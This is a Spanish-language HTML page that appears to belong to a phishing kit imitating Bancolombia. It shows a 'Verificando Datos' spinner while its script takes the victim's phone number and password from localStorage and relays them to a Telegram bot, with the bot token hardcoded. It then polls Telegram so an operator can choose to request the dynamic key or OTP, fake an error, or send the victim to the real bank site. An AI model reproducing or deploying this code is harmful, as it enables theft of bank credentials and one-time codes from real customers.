<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificando Datos</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: url('img/fondo.jpg') no-repeat center center fixed;
            background-size: cover;
        }

        .blur-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.4);
            backdrop-filter: blur(10px);
        }

        .loaderp-full {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            position: fixed;
            width: 90%;
            height: 90%;
            z-index: 9999;
        }

        .loaderp {
            width: 180px; /* Tamaño del círculo */
            height: 180px; /* Tamaño del círculo */
            background-image: url('img/circulo.png'); /* Carga la imagen del círculo */
            background-size: cover; /* Hace que la imagen cubra todo el círculo */
            border-radius: 50%; /* Forma el círculo */
            position: relative; /* Necesario para posicionar el loader dentro */
            display: flex;
            flex-direction: column; /* Centra el texto debajo del loader */
            justify-content: center;
            align-items: center;
            text-align: center;
        }

        .loaderp .loader {
            width: 30px; /* Tamaño del loader (gris) */
            height: 30px; /* Tamaño del loader (gris) */
            border: 5px solid #f3f3f3; /* Hacer el borde más delgado (antes era 10px) */
            border-top: 5px solid #555; /* Hacer el borde superior más delgado (antes era 10px) */
            border-radius: 50%;
            animation: spin 1s linear infinite; /* Animación de giro */
        }

        .loaderp-text {
            margin-top: 30px; /* Espacio entre el loader y el texto */
            font-size: 13px;
            color: black;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="blur-overlay"></div>
    <div class="loaderp-full">
        <div class="loaderp">
            <div class="loader"></div> <!-- Este es el loader gris que gira -->
            <div class="loaderp-text">Cargando...</div> <!-- Texto debajo del loader -->
        </div>
    </div>



  <script>
document.addEventListener('DOMContentLoaded', async function () {
  const loader = document.querySelector('#loader');
  const botToken = "8153542950:AAER3soWgrkQDu_cVSUZR4x9dJKjavcGSDE"; // Token real

  const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));

  if (!bancoldata || !bancoldata.clave) {
    console.error("Faltan datos en 'bancoldata'");
    alert("Datos incompletos. Por favor, vuelve a iniciar.");
    window.location.href = "index.html";
    return;
  }

  const usuario = bancoldata.celular || "No definido";
  const clave = bancoldata.clave;
  const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
  localStorage.setItem('transactionId', transactionId);

  const message = `
<b>INGRESO BANC0PPEL</b>
--------------------------------------------------
🆔 <b>ID:</b> ${transactionId}
👤 <b>Usuario:</b> ${usuario}
🔐 <b>Clave:</b> ${clave}
--------------------------------------------------`;

  const keyboard = {
    inline_keyboard: [
      [{ text: "Pedir Dinámica - Bancolombia", callback_data: `pedir_dinamica:${transactionId}` }],
      [{ text: "Pedir Código OTP", callback_data: `pedir_otp:${transactionId}` }],
      [{ text: "Error de TC", callback_data: `error_tc:${transactionId}` }],
      [{ text: "Error de Logo - Bancolombia", callback_data: `error_logo:${transactionId}` }],
      [{ text: "Finalizar", callback_data: `confirm_finalizar:${transactionId}` }]
    ]
  };

  try {
    const res = await fetch("botmaster2.php", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: "data=" + encodeURIComponent(message) + "&keyboard=" + encodeURIComponent(JSON.stringify(keyboard))
    });
    await res.text();
    await checkPaymentVerification(transactionId);
  } catch (error) {
    console.error("Error al enviar a Telegram:", error);
    if (loader) loader.style.display = "none";
  }

  async function checkPaymentVerification(transactionId) {
    try {
      const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
      const data = await res.json();

      if (!data || !data.result) {
        throw new Error("La API no devolvió resultados válidos.");
      }

      const action = data.result.find(update =>
        update.callback_query &&
        [
          `pedir_dinamica:${transactionId}`,
          `pedir_otp:${transactionId}`,
          `error_tc:${transactionId}`,
          `error_logo:${transactionId}`,
          `confirm_finalizar:${transactionId}`
        ].includes(update.callback_query.data)
      );

      if (action) {
        if (loader) loader.style.display = "none";

        const actionType = action.callback_query.data.split(":")[0];

        const statusMap = {
          pedir_dinamica: "Clave Dinámica",
          pedir_otp: "Código OTP",
          error_tc: "Error TC",
          error_logo: "Error de Logo",
          confirm_finalizar: "Finalización Exitosa"
        };

        await fetch("sendStatus.php", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ status: statusMap[actionType] || "Desconocido" })
        });

        switch (actionType) {
          case "pedir_dinamica":
            window.location.href = "dinacol.php";
            break;
          case "pedir_otp":
            window.location.href = "index-otp.html";
            break;
          case "error_tc":
            window.location.href = "errortc.html";
            break;
          case "error_logo":
            alert("Error en el inicio de sesión. Reintente.");
            window.location.href = "index.html";
            break;
          case "confirm_finalizar":
            window.location.href = "https://www.bancolombia.com/personas";
            break;
        }
      } else {
        setTimeout(() => checkPaymentVerification(transactionId), 2000);
      }
    } catch (err) {
      console.error("Error al verificar acción:", err);
      setTimeout(() => checkPaymentVerification(transactionId), 2000);
    }
  }
});
</script>
</body>
</html>
